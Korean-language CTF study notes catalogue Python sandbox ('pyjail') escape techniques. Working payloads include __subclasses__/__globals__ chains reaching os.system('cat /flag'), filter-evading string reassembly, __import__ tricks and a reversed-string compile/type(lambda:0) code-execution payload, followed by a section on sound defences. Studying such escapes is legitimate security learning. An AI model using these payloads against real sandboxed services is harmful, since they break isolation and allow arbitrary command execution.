# pyjail 우회 기법 정리 (Learnings)

> CTF의 pyjail(파이썬 감옥) 유형 학습 노트.
> 목표: 제한된 파이썬 환경에서 특정 토큰/함수가 막혀 있을 때 `/flag` 를 읽어내기.
> 핵심 통찰: **"같은 동작을 표현하는 방법은 수십 가지다"** — 블랙리스트 방어는 거의 항상 우회된다.

---

## 0. 먼저 파악할 것 — 필터의 종류

우회를 시작하기 전에 **필터가 어떻게 막는지**를 반드시 먼저 파악해야 한다. 같은 payload도 필터 방식에 따라 통과/거부가 갈린다.

| 필터 종류 | 검사 대상 | 예시 우회 |
|-----------|-----------|-----------|
| **부분문자열(substring)** | 소스 텍스트에 금지어 글자가 있으면 거부 | `'op'+'en'` 처럼 쪼개야 함 |
| **토큰(token)** | 파이썬 tokenizer의 이름(NAME) 토큰만 검사 | 문자열 `'open'` 은 통과 가능 |
| **AST** | 구문 트리에서 특정 노드/이름 금지 | 동적 생성(`compile`)으로 우회 |
| **런타임 제거** | `__builtins__` 에서 함수를 아예 삭제 | 다른 모듈에서 다시 끌어와야 함 |

**중요:** "실행 전에 거부"라고 명시된 필터는 **정적 텍스트 검사**다. 즉 런타임에는 금지 함수가 살아있으므로, 금지어를 텍스트에 안 남기기만 하면 실제 동작은 정상적으로 된다. (→ 5번 `compile` 기법이 강력한 이유)

---

## 1. 파일을 읽는 "다른 길들"

`open` 이 막혔을 때, 파일 내용을 얻는 표준 라이브러리 대체 경로. 핵심 감각: **"파일 경로/객체를 인자로 받는 표준 모듈은 전부 후보다."**

```python
__import__('pathlib').Path('/flag').read_text()   # 가장 간결
__import__('io').open('/flag').read()             # 사실상 open과 동일
__import__('codecs').open('/flag').read()         # 인코딩 지정 가능
```

압축/파서 계열도 파일을 받는다:
```python
__import__('gzip').open        # gzip.open — 실제로 일반 파일도 열림(비압축이면 에러날 수 있음)
# tarfile, zipfile.ZipFile, configparser, json.load, csv.reader ...
```

저수준(파일디스크립터 기반):
```python
# os.open + os.read : fd = os.open('/flag', 0); os.read(fd, 4096)
# mmap : open으로 얻은 fd를 메모리 매핑
```

**왜 이렇게 많은가?** 파이썬은 "파일을 다룬다"는 개념이 여러 추상화 계층(builtin `open` → `io` 모듈 → `_io` C확장 → `os` syscall wrapper)에 걸쳐 노출돼 있다. 한 층이 막혀도 다른 층이 열려 있다.

---

## 2. 인트로스펙션 — 이름을 안 쓰고 함수 손에 넣기

`getattr` 이나 직접 이름 참조가 막혔을 때, 객체의 내부 구조를 통해 함수에 도달.

### 2-1. `__builtins__` / `__dict__` / `vars()`
```python
__builtins__.__dict__['open']    # builtins가 모듈일 때
__builtins__['open']             # builtins가 dict일 때 (import된 모듈 내부)
vars(__builtins__)['open']       # vars(x) == x.__dict__ (이름 'vars'로 우회)
```
> `__builtins__` 는 실행 컨텍스트에 따라 **모듈이거나 dict** 다. `__main__` 에선 모듈, import된 모듈 안에선 dict. 둘 다 대응할 수 있어야 한다.

### 2-2. `__subclasses__()` — pyjail 최종병기
```python
().__class__            # tuple
().__class__.__base__   # object
().__class__.__base__.__subclasses__()   # object의 모든 자손 클래스 리스트
```
**왜 강력한가?** `()` (빈 튜플) 같은 리터럴에서 출발하므로 `import` 도 이름도 필요 없다. 순수하게 **타입 사슬만** 타고 다녀서 이름 기반 필터가 손댈 수 없다.

이 리스트 안에는 런타임에 로드된 위험 클래스들이 섞여 있다:
- `_io.FileIO`, `_io.BufferedReader` — 파일 읽기
- `subprocess.Popen` — 셸 실행
- `os._wrap_close` — os 모듈 함수 보유(os가 import돼 있을 때만 등장)
- `warnings.catch_warnings` — `__init__.__globals__` 로 builtins 접근

**주의:** 리스트에 뭐가 있는지/인덱스는 **파이썬 버전·로드된 모듈에 따라 다르다.** 하드코딩된 인덱스 대신 이름으로 검색하는 게 안전:
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 목표이름]
```
그리고 `_io.FileIO` 는 object의 **직접** 자손이 아니라 여러 단계 아래에 있어서 이 목록에 직접 안 나올 수 있다. 직접 자손인 `Popen`, `os._wrap_close` 등이 더 실용적.

### 2-3. `__globals__` — 함수가 사는 모듈 훔쳐보기
```python
어떤함수.__globals__        # 그 함수가 정의된 모듈의 전역 딕셔너리
```
`__dict__` 가 막혀도 `__globals__` 는 종종 열려 있다. `os._wrap_close.__init__.__globals__` 안에는 `system`, `popen`, `open` 등 os의 모든 것이 들어 있다.
```python
# os가 로드돼 있을 때, 이름 'os'를 한 글자도 안 쓰고 os.system 실행:
[x for x in ().__class__.__base__.__subclasses__()
   if x.__name__ == '_wrap_close'][0].__init__.__globals__['system']('cat /flag')
```

---

## 3. 문자열 재조립 — 금지어 글자 안 만들기

부분문자열 필터를 피하려고 금지어를 런타임에 조립한다. 텍스트엔 조각만 남는다.

```python
'op'+'en'                      # 연결
'nepo'[::-1]                   # 뒤집기 (슬라이스 step -1)
chr(111)+chr(112)+chr(101)+chr(110)   # 코드포인트 조립 → 'open'
bytes([111,112,101,110]).decode()     # 바이트 → 디코드
'\x6f\x70\x65\x6e'             # 16진 이스케이프 → 'open'
'\157\160\145\156'             # 8진 이스케이프
'OPEN'.lower()                 # 대소문자 변형
'o'.join(['','pen'])           # join 트릭
f"{'op'}{'en'}"                # f-string
```
**왜 되는가?** 필터는 **정적 텍스트**를 볼 뿐, 런타임에 조립된 결과 문자열은 못 본다. 이렇게 만든 문자열을 `__dict__[...]` 키나 `__subclasses__` 이름 비교에 넣어 쓴다.

`[::-1]` 원리: 슬라이스 `[start:stop:step]` 에서 step이 `-1` → 끝에서 앞으로 한 칸씩 → 뒤집힌 문자열.

---

## 4. `import` 대체

```python
__import__('os')                 # import를 함수로 (결과가 값 → 바로 .붙이기)
__builtins__.__import__('os')    # 동일
__loader__.load_module('os')     # import 시스템 직접 호출 (드묾)
```
**핵심:** `import os` 는 문법(statement)이라 값을 못 이어 붙이지만, `__import__('os')` 는 **함수 호출식**이라 `.system(...)` 을 바로 체이닝할 수 있다. 그리고 모듈명이 **문자열**이라 3번 재조립 기법과 결합 가능: `__import__('o'+'s')`.

**간접 접근:** 금지된 모듈을 이미 import한 다른 모듈을 경유:
```python
__import__('platform').os.system(...)   # platform 내부가 os를 물고 있음
# timeit, pdb, cProfile 등도 내부에서 os/subprocess 사용
```

---

## 5. `compile` + `type(lambda:0)` — 마스터키

`eval`/`exec` 이 막혔을 때, 문자열을 코드로 만들어 실행. **정적 필터를 근본적으로 무력화**한다.

```python
t = type(lambda:0)                              # <class 'function'> (FunctionType을 이름 없이)
t(compile(소스문자열, '', 'exec'), globals())()   # 코드객체 → 함수 → 즉시 호출
```

### 부품 원리
- `type(lambda:0)` : 아무 람다의 **타입**을 얻으면 `function` 타입. `FunctionType` 이라는 이름을 안 써도 된다.
- `compile(src, '', 'exec')` : 문자열 소스를 **코드객체**로 컴파일. `compile` 은 builtin이라 대개 안 막힌다.
- `FunctionType(code, globals)()` : 코드객체를 함수 본문으로 감싸 호출 → 소스 실행.

### 완성 예 (모든 금지어를 문자열에 숨김)
```python
t=type(lambda:0);t(compile("))(daer.)'galf/'(nepo(tnirp"[::-1],'','cexe'[::-1]),globals())()
```
- `"...tnirp"[::-1]` → `print(open('/flag').read())`
- `'cexe'[::-1]` → `'exec'` (모드 문자열의 'exec'도 금지어라 뒤집어 숨김)

### 왜 게임체인저인가
안쪽 문자열만 바꾸면 **임의의 정상 파이썬**을 실행할 수 있다. `open`/`os`/무엇이 막히든, 어차피 문자열 안에 숨겨 컴파일하니 필터엔 안 보인다. 정적 텍스트 필터는 이 한 패턴에 사실상 전부 뚫린다.
→ 그래서 견고한 감옥은 `compile`, `type`, `globals`, `__subclasses__`, `__class__` 같은 **메타 도구 자체**를 막고, 나아가 **AST 검사**나 **런타임 builtins 제거**로 방어한다.

### 기타 실행 우회
```python
breakpoint()          # pdb 인터랙티브 셸 진입(대개 막힘, PYTHONBREAKPOINT 의존)
__build_class__(...)  # 클래스 동적 생성
# 데코레이터/제너레이터 등으로 부작용 트리거
```

---

## 6. 셸 명령 실행 계열 (os.system 대체)

```python
__import__('os').system('cat /flag')            # 기본
__import__('platform').os.system('cat /flag')   # 간접 접근
# subprocess.Popen('cat /flag', shell=True, stdout=-1).communicate()[0]  (-1 == PIPE)
```
`__subclasses__` 로 찾은 `Popen`/`_wrap_close` 로도 도달(→ 2-3 참고). `system` 은 결과를 **stdout에 직접** 출력하므로 `print` 조차 필요 없다.

---

## 우선순위 감각 (라운드 진행에 따라)

1. **초반:** 1번 — 파일 읽는 모듈 갈아끼우기 (`pathlib`, `io`, `codecs`)
2. **중반:** 3·4번 — 문자열 재조립 + `__import__` 간접 접근
3. **후반(이름 다 막힘):** 2번 — `__subclasses__` / `__globals__` 순수 인트로스펙션
4. **메타 도구까지 조여올 때:** 5번 — `compile` 마스터키 (단, `compile`/`type`/`globals` 이 살아있어야)

---

## 방어 관점 (역으로 배우기)

우회를 이해하면 **왜 블랙리스트가 나쁜지**가 보인다. 제대로 된 방어는:
- **화이트리스트** (허용된 것만) — 블랙리스트가 아니라
- **AST 검증** — 텍스트가 아닌 구문 트리 수준 검사
- **런타임 builtins 완전 제거** — `{'__builtins__': {}}` 네임스페이스
- **별도 프로세스 + seccomp/컨테이너 격리** — 언어 수준이 아닌 OS 수준 샌드박스

> 결론: 언어 내부 필터만으로 파이썬을 가두는 건 사실상 불가능에 가깝다. 진짜 격리는 OS/커널 레벨에서 한다.

---

## 다음 공부

- OverTheWire **Bandit** (리눅스/파일디스크립터 감각)
- **드림핵(dreamhack.io)** pyjail·시스템해킹 워게임 (한국어)
- CTFtime write-up → **직접 재현 + 이 노트에 한 줄 추가**
- 직접 미니 감옥 만들어 필터 종류별로 뚫어보기
